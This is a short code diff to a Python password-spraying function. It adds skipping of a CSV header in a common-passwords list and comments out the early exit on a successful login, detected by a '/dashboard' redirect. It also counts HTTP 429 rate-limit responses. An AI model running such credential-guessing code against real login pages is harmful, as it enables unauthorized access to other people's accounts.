@@ -18,6 +18,7 @@ def password_spraying():
     
     with open("common_passwords.csv", newline="", encoding="utf-8") as f:
         reader = csv.reader(f)
+        header = next(reader)
         start = time.perf_counter()
         count = 0
         for row in reader:
@@ -33,8 +34,8 @@ def password_spraying():
                             }
                         )
                         success, code_resp = "/dashboard" in response.url, response.status_code 
-                        if success :
-                            break
+                        #if success :
+                         #   return 
                         if code_resp == 429:
                         
                             count+=1
